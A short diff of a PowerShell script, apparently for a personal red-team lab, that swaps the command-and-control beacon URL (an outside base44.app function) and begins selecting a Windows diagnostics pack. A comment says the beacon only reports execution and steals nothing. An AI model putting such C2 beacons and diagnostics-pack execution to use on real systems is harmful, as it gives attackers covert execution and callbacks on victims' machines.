@@ -2,7 +2,7 @@
 # Lab propio. El beacon solo avisa que el pack ejecuto: no roba archivos.
 $ErrorActionPreference = 'Stop'
 
-$C2 = 'https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Beacon'
+$C2 = 'https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20Beacon'
 
 # 1) elegir un pack del sistema (benigno)
 $src = 'C:\Windows\diagnostics\system\Audio'
